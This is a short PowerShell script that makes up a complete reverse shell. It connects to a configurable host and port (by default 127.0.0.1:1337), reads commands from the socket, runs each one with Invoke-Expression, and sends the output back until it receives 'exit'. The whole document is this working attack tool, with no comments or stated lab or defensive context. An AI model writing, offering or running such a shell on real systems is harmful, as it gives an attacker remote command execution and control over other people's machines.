param (
    [string]$Host = "127.0.0.1",
    [int]$Port = 1337
)

$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($Host, $Port)
$stream = $client.GetStream()
$reader = New-Object IO.StreamReader $stream
$writer = New-Object IO.StreamWriter $stream
$writer.AutoFlush = $true

while ($client.Connected) {
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") { break }

    try {
        $output = Invoke-Expression $cmd 2>&1
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("[x] Failed: $_")
    }
}
$client.Close()
